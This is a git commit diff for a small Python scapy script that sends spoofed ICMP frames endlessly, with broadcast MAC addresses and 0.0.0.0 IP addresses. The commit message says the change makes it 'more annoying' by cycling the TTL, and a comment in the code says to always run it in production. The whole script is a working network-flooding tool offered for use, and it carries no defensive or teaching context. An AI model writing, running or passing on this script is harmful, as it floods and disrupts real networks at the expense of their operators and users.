b220f13b7d289f00e1f1542c9ec7413cc586ac33
SnipSnap (Harrison K) <70385098+SnipSnapp@users.noreply.github.com>
2023-09-18 13:43:32 -0500

    Update Thors_Overly_Talkative_Cousin.py
    Made it more annoying

--- Thors_Overly_Talkative_Cousin.py
+++ Thors_Overly_Talkative_Cousin.py
@@ -1,5 +1,9 @@
 from scapy.all import *
 #ALWAYS RUN IN PROD
-Cool_guy_mac = Ether(src='FF:FF:FF:FF:FF:FF', dst= 'FF:FF:FF:FF:FF:FF')/IP(src='0.0.0.0',dst='0.0.0.0',ttl=250)/ICMP()
+TTL=1
 while True:
+  Cool_guy_mac = Ether(src='FF:FF:FF:FF:FF:FF', dst= 'FF:FF:FF:FF:FF:FF')/IP(src='0.0.0.0',dst='0.0.0.0',ttl=TTL)/ICMP()
+  TTL = TTL + 1
   sendp(Cool_guy_mac)
+  if TTL > 10:
+    TTL=1
